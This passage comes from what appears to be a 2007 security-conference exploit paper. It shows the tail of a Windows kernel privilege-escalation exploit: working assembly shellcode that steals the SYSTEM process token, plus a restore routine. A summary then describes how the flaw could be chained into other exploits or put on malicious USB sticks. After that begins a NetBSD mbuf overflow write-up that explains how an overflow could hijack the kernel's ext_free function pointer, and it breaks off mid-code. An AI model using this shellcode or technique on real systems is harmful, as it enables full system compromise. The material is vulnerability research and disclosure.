equ 8  
; PID with SYSTEM-token 
OFF_PID 
equ 0x9c 
; UniqueProcessId-offset 
OFF_FLINK 
equ 0xa0 
; Flink-offset 
OFF_TOKEN 
equ 0x12c 
; Token-offset 
%else 
PID_SYSTEM  
equ 4  
; PID with SYSTEM-token 
OFF_PID 
equ 0x84 
; UniqueProcessId-offset  
OFF_FLINK 
equ 0x88 
; Flink-offset 
OFF_TOKEN 
equ 0xc8 
; Token-offset 
%endif 
PayloadCode: 
; Get pointer to exploit process 
mov eax, [fs:OFF_ETHREAD] 
; eax = ETHREAD 
mov eax, [eax+OFF_EPROCESS] 
; eax = EPROCESS 
mov ecx, eax 
FindSystemProcess: 
mov eax, [eax+OFF_FLINK] 
; EPROCESS.ActiveProcessLinks.Flink 
sub eax, OFF_FLINK 
; eax = EPROCESS 
cmp DWORD [eax+OFF_PID], PID_SYSTEM ; Check if PID_SYSTEM 
jnz FindSystemProcess 
; If not, continue searching 
mov edx, [eax+OFF_TOKEN] 
; edx = EPROCESS.Token (System) 
mov eax, [ecx+OFF_TOKEN] 
; eax = EPROCESS.Token (Exploit) 
mov [ecx+OFF_TOKEN], edx 
; Exploit.Token = System.Token 
ret 
RestoreCode: 
; Get pointer to exploit process 
mov eax, [fs:OFF_ETHREAD] 
; eax = ETHREAD 
mov eax, [eax+OFF_EPROCESS] 
; eax = EPROCESS 
mov ecx, [esp+4]  
; ecx = Arg (pdwArgs) 
mov edx, [ecx] 
; edx = OrigToken 
mov [eax+OFF_TOKEN], edx 
; EPROCESS.Token = OrigToken 
mov eax, [ecx+4]  
; eax = SysCallAddr 
mov edx, [ecx+8]  
; edx = OrigSysCall 
mov [eax], edx 
; *SysCallAddr = OrigSysCall 
ret
Summary 
Except for being used by restricted users to escalate their privileges on a system this vulnerability could 
be abused for embedding an automatic privilege escalation stub into existing exploits for 
browser/office/whatever-bugs or on a malicious U3 USB-stick, to mention a few examples. 
It totally bypasses the NT security model and makes any exploit which achieves code execution with 
any privileges a full system compromising exploit. It could also be used to bypass sandboxing 
solutions, such as SandboxIE [7]. In my humble opinion, this is quite serious, and I’m surprised to see 
that it took Microsoft several years to provide a patch for it. 
To Microsofts defense, they might have considered this to be only a local DoS issue, until our 
BlackHat Europe talk… 
References 
1. http://projects.info-pull.com/mokb/ 
2. http://msdn.microsoft.com/msdnmag/issues/03/01/GDILeaks/ 
3. http://www.microsoft.com/whdc/devtools/debugging/default.mspx 
4. http://www.catch22.net/tuts/vmware.asp 
5. http://www.rootkit.com/newsread_print.php?newsid=176 
6. http://www.scan-associates.net/papers/navx.c 
7. http://www.sandboxie.com/
NetBSD Local mbuf Overflow 
Vulnerability found and exploit developed by 
Christer Öberg 
NetBSD NETISO Introduction 
The NetBSD Vulnerability presented at Blackhat Las Vegas 2007 at the kernel wars talk is similar to 
the NetBSD vulnerability from the original kernel wars talk in Amsterdam. Both bugs were found 
using a fuzzing engine developed by Claes Nyberg .  
The bug 
This bug is very similar to the CLNP vulnerability that was demonstrated in Amsterdam. A length 
variable in a sockaddr structure is exploited through a different system call (bind()). A call is made to 
bcopy() with the length argument controlled by the user through the sockaddr. This enables an attacker 
to overwrite parts of tp_pcb structure, including a sockbuf structure within it. 
The sockbuf structure contains among other things mbuf pointers which can be controlled with this 
overflow. When the socket is closed these mbufs within the sockbuf structure are freed by sbdrop().  
The bcopy call from tp_pcbbind() is shown below: 
892 bcopy(tsel, tpcb->tp_lsuffix, (tpcb->tp_lsuffixlen = tlen)); 
The sockbuf and tp_pcb structures are quite large and is therefore not shown here. They can be found 
in sys/netiso/tp_pbc.h and sys/socketvar.h respectively.  
The sbdrop function (shown on the next page), will free the mbufs associated with the sockbuf that was 
overwritten with the overflow earlier. This function is called when the socket is closed. 
1024 sbdrop(struct sockbuf *sb, int len) 
1025 { 
1026         struct mbuf     *m, *mn, *next; 
1027  
1028         next = (m = sb->sb_mb) ? m->m_nextpkt : 0; 
1029         while (len > 0) { 
1030                 if (m == 0) { 
1031                         if (next == 0) 
1032                                 panic("sbdrop"); 
1033                         m = next; 
1034                         next = m->m_nextpkt; 
1035                         continue; 
1036                 } 
1037                 if (m->m_len > len) { 
1038                         m->m_len -= len; 
1039                         m->m_data += len; 
1040                         sb->sb_cc -= len; 
1041                         break; 
1042                 } 
1043                 len -= m->m_len; 
1044                 sbfree(sb, m); 
1045                 MFREE(m, mn); 
1046                 m = mn; 
1047         } 
1048         while (m && m->m_len == 0) { 
1049                 sbfree(sb, m); 
1050                 MFREE(m, mn); 
1051                 m = mn; 
1052         } 
1053         if (m) { 
1054                 sb->sb_mb = m; 
1055                 m->m_nextpkt = next; 
1056         } else 
1057                 sb->sb_mb = next; 
1058         /* 
1059          * First part is an inline SB_EMPTY_FIXUP(). Second part 
1060          * makes sure sb_lastrecord is up-to-date if we dropped 
1061          * part of the last record. 
1062          */ 
1063         m = sb->sb_mb; 
1064         if (m == NULL) { 
1065                 sb->sb_mbtail = NULL; 
1066                 sb->sb_lastrecord = NULL; 
1067         } else if (m->m_nextpkt == NULL) 
1068                 sb->sb_lastrecord = m; 
1069 } 
Exploiting mbufs 
Mbufs are normally freed with the mfree() function shown below: 
struct mbuf * 
m_free(struct mbuf *m) 
{ 
    struct mbuf *n; 
    MFREE(m, n); 
    return (n); 
} 
The MFREE macro doing all the real work when freeing an mbuf is shown below: 
#define MFREE(m, n) \ 
    MBUFLOCK( \ 
        mbstat.m_mtypes[(m)->m_type]--; \ 
        if ((m)->m_flags & M_PKTHDR) \ 
        m_tag_delete_chain((m), NULL); \ 
        (n) = (m)->m_next; \ 
        _MOWNERREVOKE((m), 1, m->m_flags); \ 
        if ((m)->m_flags & M_EXT) { \ 
            m_ext_free(m, TRUE); \ 
        } else { \ 
            pool_cache_put(&mbpool_cache, (m)); \ 
        } \ 
) 
Here are the macros and structs that define the mbuf structure in NetBSD: 
#define MBUF_DEFINE(name, mhlen, mlen) \ 
    struct name { \ 
        struct m_hdr m_hdr; \ 
        union { \ 
            struct { \ 
            struct pkthdr MH_pkthdr; \ 
            union { \ 
                struct _m_ext MH_ext; \ 
                char MH_databuf[(mhlen)]; \ 
            } MH_dat; \ 
        } MH; \ 
        char M_databuf[(mlen)]; \ 
    } M_dat; \ 
} 
struct m_hdr { 
    struct mbuf *mh_next; /* next buffer in chain */ 
    struct mbuf *mh_nextpkt; /* next chain in queue/record */ 
    caddr_t mh_data; /* location of data */ 
    struct mowner *mh_owner; /* mbuf owner */ 
    int mh_len; /* amount of data in this mbuf */ 
    int mh_flags; /* flags; see below */ 
    paddr_t mh_paddr; /* physical address of mbuf */ 
    short mh_type; /* type of data in this mbuf */ 
}; 
struct pkthdr { 
    struct ifnet *rcvif; /* rcv interface */ 
    SLIST_HEAD(packet_tags, m_tag) tags; /* list of packet tags */ 
    int len; /* total packet length */ 
    int csum_flags; /* checksum flags */ 
    u_int32_t csum_data; /* checksum data */ 
}; 
struct _m_ext { 
    caddr_t ext_buf; /* start of buffer */ 
    void (*ext_free) /* free routine if not the usual */ 
    (struct mbuf *, caddr_t, size_t, void *); 
    void *ext_arg; /* argument for ext_free */ 
    size_t ext_size; /* size of buffer, for ext_free */ 
    struct malloc_type *ext_type; /* malloc type */ 
    struct mbuf *ext_nextref; 
    struct mbuf *ext_prevref; 
    union { 
        paddr_t extun_paddr; /* physical address (M_EXT_CLUSTER) */ 
                             /* pages (M_EXT_PAGES) */ 
#ifdef M_EXT_MAXPAGES 
        struct vm_page *extun_pgs[M_EXT_MAXPAGES]; 
#endif 
    } ext_un; 
#define ext_paddr ext_un.extun_paddr 
#define ext_pgs ext_un.extun_pgs 
#ifdef DEBUG 
    const char *ext_ofile; 
    const char *ext_nfile; 
    int ext_oline; 
    int ext_nline; 
    #endif 
}; 
MBUF_DEFINE(mbuf, MHLEN, MLEN); 
The MFREE macro will call the m_ext_free() function provided that we have set the 
M_EXT flag on our mbuf.  
The m_ext_free() function is shown below: 
m_ext_free(struct mbuf *m, boolean_t dofree) 
{ 
    if (MCLISREFERENCED(m)) { 
        MCLDEREFERENCE(m); 
    } else if (m->m_flags & M_CLUSTER) { 
        pool_cache_put_paddr(m->m_ext.ext_arg, 
        m->m_ext.ext_buf, m->m_ext.ext_paddr); 
    } else if (m->m_ext.ext_free) { 
        (*m->m_ext.ext_free)(dofree ? m : NULL, m->m_ext.ext_buf, 
        m->m_ext.ext_size, m->m_ext.ext_arg); 
        dofree = FALSE; 
    } else { 